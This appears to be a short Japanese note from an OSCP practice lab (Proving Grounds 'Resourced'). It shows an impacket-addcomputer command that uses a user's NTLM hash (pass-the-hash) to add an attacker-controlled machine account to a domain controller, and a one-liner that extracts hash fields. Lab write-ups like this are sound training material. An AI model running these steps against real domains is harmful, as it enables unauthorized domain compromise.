ドメインに新しいマシンアカウントの作成
https://medium.com/@ardian.danny/oscp-practice-series-65-proving-grounds-resourced-05eb9a129e28
```zsh
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.239.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
```
![](../../../Assets/Images/Pasted%20image%2020260502094014.png)

```zsh
cat hashes|cut -d : -f 4
```
